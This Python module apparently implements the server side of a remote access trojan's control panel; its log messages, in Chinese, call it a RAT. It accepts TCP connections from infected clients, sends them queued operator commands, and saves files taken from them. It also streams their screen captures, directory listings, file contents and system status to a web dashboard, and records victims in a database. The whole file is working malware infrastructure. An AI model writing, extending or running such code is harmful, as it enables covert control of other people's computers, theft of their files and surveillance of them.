import socket
import threading
import json
import base64
import os
import time
import queue
from datetime import datetime
from ..extensions import socketio
from ..services import client_manager
from ..utils.helpers import human_readable_size
from ..config import BaseConfig

def reliable_send(sock, data_dict):
    payload = json.dumps(data_dict).encode('utf-8') + b'\n'
    sock.sendall(payload)

def client_handler(conn, addr, client_id, app):
    q = client_manager.register_client(client_id, conn, addr)
    print(f"[+] RAT客户端已连接: {addr}, ID: {client_id}")
    socketio.emit('new_client', {'id': client_id, 'addr': str(addr)})

    # 在数据库中创建/更新客户端为在线
    try:
        from ..extensions import db
        from ..models import Client
        with app.app_context():
            client = Client.query.filter_by(client_id=client_id).first()
            ip_str = str(addr[0]) if isinstance(addr, tuple) and len(addr) > 0 else str(addr)
            if not client:
                client = Client(client_id=client_id, ip_address=ip_str, status='online', last_seen=datetime.utcnow())
                db.session.add(client)
            else:
                client.ip_address = ip_str
                client.status = 'online'
                client.last_seen = datetime.utcnow()
            db.session.commit()
    except Exception as e:
        # 避免数据库问题影响连接主流程
        print(f"[DB] 更新客户端在线状态失败: {e}")

    buffer = b''
    try:
        conn.setblocking(False)
        while True:
            try:
                cmd = q.get_nowait()
                reliable_send(conn, cmd)
            except queue.Empty:
                pass

            try:
                part = conn.recv(4096)
                if not part:
                    break
                buffer += part
            except BlockingIOError:
                pass

            while b'\n' in buffer:
                message, buffer = buffer.split(b'\n', 1)
                try:
                    data = json.loads(message.decode('utf-8'))
                except:
                    continue

                if data.get('status') == 'connected':
                    info = client_manager.client_info[client_id]
                    info['user'] = data.get('user', '未知')
                    info['initial_cwd'] = data.get('cwd', '未知')
                    info['os'] = data.get('os', '未知')
                    socketio.emit('client_updated', {'id': client_id, **info})

                    # 同步系统信息到数据库
                    try:
                        from ..extensions import db
                        from ..models import Client
                        with app.app_context():
                            client = Client.query.filter_by(client_id=client_id).first()
                            if client:
                                client.os_type = data.get('os')
                                client.status = 'online'
                                client.last_seen = datetime.utcnow()
                                db.session.commit()
                    except Exception as e:
                        print(f"[DB] 同步客户端信息失败: {e}")
                    continue

                if "file" in data and "data" in data:
                    filename = data["file"]
                    content = base64.b64decode(data["data"])
                    os.makedirs(BaseConfig.DOWNLOADS_DIR, exist_ok=True)
                    unique_filename = f"{client_id}_{int(time.time())}_{os.path.basename(filename)}"
                    path = os.path.join(BaseConfig.DOWNLOADS_DIR, unique_filename)
                    with open(path, "wb") as f:
                        f.write(content)
                    socketio.emit('command_result', {'output': f"文件已保存: {unique_filename}"})

                elif "output" in data:
                    # Emit a generic result for single command sends, and a specific one for the batch commander
                    socketio.emit('command_result', {'output': data['output'], 'target_id': client_id})
                    socketio.emit('batch_command_result', {'output': data['output'], 'client_id': client_id})

                elif "dir_list" in data:
                    socketio.emit('dir_list', {'client_id': client_id, 'dir_list': data['dir_list']})

                elif "file_text" in data:
                    socketio.emit('file_text', {
                        'client_id': client_id,
                        'path': data.get('path'),
                        'text': data.get('file_text'),
                        'is_base64': data.get('is_base64', False)
                    })

                elif data.get('type') == 'screen_frame':
                    # 转发客户端屏幕帧到前端（包含尺寸与虚拟屏参数，便于坐标映射）
                    socketio.emit('screen_frame_update', {
                        'client_id': client_id,
                        'data': data.get('data'),
                        'w': data.get('w'),
                        'h': data.get('h'),
                        'vx': data.get('vx'),
                        'vy': data.get('vy'),
                        'vw': data.get('vw'),
                        'vh': data.get('vh'),
                    })

                elif data.get('type') == 'status_update':
                    # 转发状态更新到前端
                    socketio.emit('status_update', {
                        'client_id': client_id,
                        'cpu_percent': data.get('cpu_percent'),
                        'mem_percent': data.get('mem_percent')
                    })
    finally:
        client_manager.remove_client(client_id)
        conn.close()
        socketio.emit('client_disconnected', {'id': client_id})

        # 在数据库中标记离线
        try:
            from ..extensions import db
            from ..models import Client
            with app.app_context():
                client = Client.query.filter_by(client_id=client_id).first()
                if client:
                    client.status = 'offline'
                    client.last_seen = datetime.utcnow()
                    db.session.commit()
        except Exception as e:
            print(f"[DB] 标记客户端离线失败: {e}")

def start_tcp_server(app):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', BaseConfig.RAT_PORT))
    srv.listen(5)
    print(f"[*] RAT TCP监听 {BaseConfig.RAT_PORT}")
    cid = 0
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=client_handler, args=(conn, addr, str(cid), app), daemon=True).start()
        cid += 1
